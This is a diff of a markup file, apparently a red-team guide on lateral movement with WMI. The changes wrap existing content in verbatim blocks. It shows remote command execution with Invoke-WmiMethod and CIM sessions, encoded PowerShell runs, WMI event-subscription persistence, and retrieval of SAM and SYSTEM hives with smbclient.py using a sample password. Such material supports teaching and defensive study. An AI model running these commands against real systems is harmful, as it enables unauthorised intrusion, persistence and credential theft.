@@ -26,7 +26,9 @@
 
 \subtree{
 \title{Overview}
-\p{WMI (Windows Management Instrumentation) is a legitimate Windows administration framework that red teams abuse for lateral movement because it provides remote command execution without deploying additional services or leaving obvious artifacts like PsExec. Impacket's wmiexec.py creates a semi-interactive shell over WMI by executing commands through Win32_Process.Create and reading output via temporary files on ADMIN$ share. Unlike PsExec, WMIExec does not install a service on the target, making it stealthier and less likely to trigger security alerts. WMI-based lateral movement maps to MITRE ATT&CK T1047 (Windows Management Instrumentation) and is used by threat actors including APT29, APT32, and Lazarus Group.}
+\pre{\startverb
+WMI (Windows Management Instrumentation) is a legitimate Windows administration framework that red teams abuse for lateral movement because it provides remote command execution without deploying additional services or leaving obvious artifacts like PsExec. Impacket's wmiexec.py creates a semi-interactive shell over WMI by executing commands through Win32_Process.Create and reading output via temporary files on ADMIN$ share. Unlike PsExec, WMIExec does not install a service on the target, making it stealthier and less likely to trigger security alerts. WMI-based lateral movement maps to MITRE ATT&CK T1047 (Windows Management Instrumentation) and is used by threat actors including APT29, APT32, and Lazarus Group.
+\stopverb}
 }
 
 \subtree{
@@ -148,12 +150,16 @@
 
 \subtree{
 \title{Using PowerShell Invoke-WmiMethod}
-\p{$cred = Get-Credential Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName 10.10.10.50 ` -Credential $cred -ArgumentList "cmd.exe /c ipconfig > C:\startverb \temp\stopverb\startverb \output\stopverb.txt"}
+\pre{\startverb
+$cred = Get-Credential Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName 10.10.10.50 ` -Credential $cred -ArgumentList "cmd.exe /c ipconfig > C:\temp\output.txt"
+\stopverb}
 }
 
 \subtree{
 \title{Using CIM sessions (modern replacement for WMI)}
-\p{$session = New-CimSession -ComputerName 10.10.10.50 -Credential $cred Invoke-CimMethod -CimSession $session -ClassName Win32_Process ` -MethodName Create -Arguments @{CommandLine="cmd.exe /c whoami"}}
+\pre{\startverb
+$session = New-CimSession -ComputerName 10.10.10.50 -Credential $cred Invoke-CimMethod -CimSession $session -ClassName Win32_Process ` -MethodName Create -Arguments @{CommandLine="cmd.exe /c whoami"}
+\stopverb}
 
 \pre{\startverb
 2. Fileless PowerShell execution via WMI:
@@ -162,7 +168,9 @@
 
 \subtree{
 \title{Execute encoded PowerShell command remotely}
-\p{$cmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Get-Process | Out-File C:\startverb \temp\stopverb\startverb \procs\stopverb.txt')) Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName 10.10.10.50 ` -Credential $cred -ArgumentList "powershell.exe -enc $cmd"}
+\pre{\startverb
+$cmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Get-Process | Out-File C:\temp\procs.txt')) Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName 10.10.10.50 ` -Credential $cred -ArgumentList "powershell.exe -enc $cmd"
+\stopverb}
 
 \pre{\startverb
 
@@ -176,9 +184,13 @@
 \li{Create WMI event subscriptions for persistence:}
 }
 
-\p{$consumer = Set-WmiInstance -Namespace "root\startverb \subscription\stopverb" -Class CommandLineEventConsumer ` -Arguments @{Name="PersistConsumer"; CommandLineTemplate="cmd.exe /c <payload>"}}
+\pre{\startverb
+$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer ` -Arguments @{Name="PersistConsumer"; CommandLineTemplate="cmd.exe /c <payload>"}
+\stopverb}
 
-\p{Set-WmiInstance -Namespace "root\startverb \subscription\stopverb" -Class __FilterToConsumerBinding ` -Arguments @{Filter=$filter; Consumer=$consumer}}
+\pre{\startverb
+Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding ` -Arguments @{Filter=$filter; Consumer=$consumer}
+\stopverb}
 
 \pre{\startverb
 
@@ -193,7 +205,9 @@
 
 \subtree{
 \title{Download saved hives}
-\p{smbclient.py domain.local/admin:'Password123'@10.10.10.50 > get C:\startverb \temp\stopverb\startverb \sam\stopverb > get C:\startverb \temp\stopverb\startverb \system\stopverb}
+\pre{\startverb
+smbclient.py domain.local/admin:'Password123'@10.10.10.50 > get C:\temp\sam > get C:\temp\system
+\stopverb}
 }
 
 \subtree{
